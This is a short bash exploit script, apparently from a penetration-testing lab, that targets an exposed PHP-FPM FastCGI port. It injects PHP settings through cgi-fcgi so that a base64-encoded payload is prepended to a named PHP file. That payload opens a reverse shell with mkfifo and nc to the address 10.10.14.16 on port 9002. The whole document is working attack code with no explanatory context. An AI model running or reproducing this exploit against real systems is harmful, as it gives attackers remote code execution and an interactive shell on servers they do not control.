#!/bin/bash

# script will try to execute PHP code on target host

PAYLOAD="<?php system(\"rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2>&1|nc 10.10.14.16 9002 >/tmp/g\");"
FILENAMES="/var/www/developers/bootstrap.php"

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    grep -q 5253 $OUTPUT
    [ $? -eq 0 ] && echo "+++ RCE success with $FN on $HOST, output in $OUTPUT"
done
